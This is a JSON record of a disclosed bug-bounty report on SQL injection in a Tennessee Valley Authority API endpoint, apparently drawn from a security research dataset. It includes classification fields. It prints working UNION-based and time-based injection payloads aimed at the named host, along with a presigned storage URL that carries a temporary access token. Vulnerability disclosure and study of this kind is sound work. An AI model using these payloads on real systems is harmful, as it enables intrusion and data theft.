{
  "reported_to": "Tennessee Valley Authority",
  "reported_by": "yassinek3ch ",
  "title": "SQL Injection on https://soa-accp.glbx.tva.gov/ via \"/api/\" path - VI-21-015",
  "content": "\nSummary:\ni've found this subdomain soa-accp.glbx.tva.gov also is vulnerable to SQLI through /api/ path\nSteps To Reproduce:\nhttps://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+HOST_NAME()--+- hostname dumped\nhttps://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+@@version--+-\nMicrosoft SQL Server 2017 (RTM-CU22-GDR) (KB4583457) - 14.0.3370.1 (X64) \\n\\tNov 6 2020 18:19:52 \\n\\tCopyright (C) 2017 Microsoft Corporation\\n\\tEnterprise Edition (64-bit) on Windows Server 2012 R2 Standard 6.3 <X64> (Build 9600: ) (Hypervisor)\\n\nalso you can retest it through time bassed trick\ntime curl -k \"https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-\"\n<image_0>\nImpact\nAn attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.\n\n",
  "severity": [
    10.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7zpb889mx1j6w04vr39wpugyq70s?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2021-03-15_at_09.47.58.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2021-03-15_at_09.47.58.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWGOAYHVA%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T030348Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBdWGOjQbnWoWM%2BubecMPFGh0IHiKIeGqzE3ALwa9H7EAiAK9tI%2FDX%2B4Ijo5QfFkvYuu%2Be4kBFFKEfs0NMnvPc9G3yq6BQj7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMAuVxqIesaUkje0XlKo4F9b%2FbrfnUzp94Osp6zB5i%2FUe56ZwO5yC%2Fui4X1eB9PKGcoxsvzfro31hiPk3yu3t40AOMjfuBkU5FZM2Q%2FNEJmXuhkEUWd5CdXnL%2F40QmdpxqPbWtiPP0KbvLs%2FLSRM5ZJK6ebyyKTuCef4i%2B8MGXZHQPU6N%2Bmg%2FqiMJVkm5hsJDgHJOGXfjpLs955qbvr1ozdevKR43uTo0jVAUXoTTR39BORtd4aQIBGEBMLdGKLVpp4YpazE3m877Ic4ljOeGipipXX8NyuwWoSewSlIKhpIZ%2FCblGkc3J6arq48QFzrnSGmiN2OPp7hQcRnvpXTXlRN0ZXeokbOvMVVoUQfOhuQ9vqDK42N8Ow2ZRs07dPiy8Ezfe3z9hjwRePe17hROq22i1B5B7FSOZ2y5EgYZeYKdsTBBAjZ66025FTq6jOdZUx5XELrBpP3kMO78Q7vlwHI%2BHjDf%2BcJm%2BX7xB1jrhi5kh6otau9pkiGEmmUcvNE01Nf7jexPdJkNM8lWTq7Le2eJv8swe0dTMRkMiohAv%2FMd7GkdeVR%2FY%2F7o3VtFcTCQxdMA4eLvLvLwbnoAfL2WdpvfoajIoTxPOZpRDqhpImHLPI4GtWOWM4vw2XIegVWNhHs7oIOdJYqfH8wRkb60mO506u4itCNO9iRXEARJttalgICxWfgW%2BT8uivTCJLxyRihJJNMAsmA7IBX9LR6bJShdNb1izcdfWzeuOBZVJlM1XDon8mFNOJ0WHzqS0CF6%2BUm5oo%2BSfE3beV%2FIGRJR5V7b7rxrBKuiJ%2FwnER4Pu%2FRX52VlBzlBwIOAo1Uxng54YRYpIr5nM3zoLep9qRwxNfDAU0AVyMEXHSckD0jHqvtEHq1bKK6CRk87tcW0tMNaliL8GOrIBoL2lX8iAgx5aAaZ7jI%2F5XIw5AxTnwtwG1woZxrNasORW8EbLCzhxqQffM5QOfGl7eELfdtDdRehpQjst337gz9d7xYhTTwTsG8pmXxBUwJbxDHXHa1jBnuADeIucY5rfIv%2F%2B%2BIgf6yTKKV7o7XEvmqRUNTz16%2BpYkVQ8SSC2ViG3dnypfVj6G%2F6L4exRKlfMEjjhgmLYTNFaw3mmqMiMn4gdAF7hIfnsYWG97gvtlINNzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=36b3fdec3e218107d560230b5db99d57e36a4e48fd9717859b7884a85721d6c5"
  },
  "disclosed_date": 1651015980,
  "report_url": "https://hackerone.com/reports/1125752",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Access the vulnerable endpoint: https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'"
    ],
    [
      2,
      "Append SQL injection payload: '+%2f*!50000union*%2f+SELECT+HOST_NAME()--+- to dump the hostname"
    ],
    [
      3,
      "Alternatively, use time-based SQL injection: '+WAITFOR+DELAY+'0:0:10'--+- to confirm vulnerability"
    ]
  ],
  "vuln_description": "The subdomain soa-accp.glbx.tva.gov is vulnerable to SQL injection through the /api/ path. An attacker can manipulate SQL statements sent to the Microsoft SQL Server database, allowing them to extract sensitive information such as hostnames and database versions, or execute arbitrary SQL commands.",
  "reason": "The vulnerability involves a straightforward SQL injection attack with common techniques like UNION-based and time-based injections. The attack does not require complex application state manipulation or understanding of novel logic. The components involved are standard for SQL injection vulnerabilities.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability involves direct manipulation of SQL queries through input parameters, which is not covered by the AuthN/AuthZ or IDOR detection methodologies described. The methodologies focus on session and resource authorization checks, not input validation or SQL query manipulation.",
    "is_detectable": false
  }
}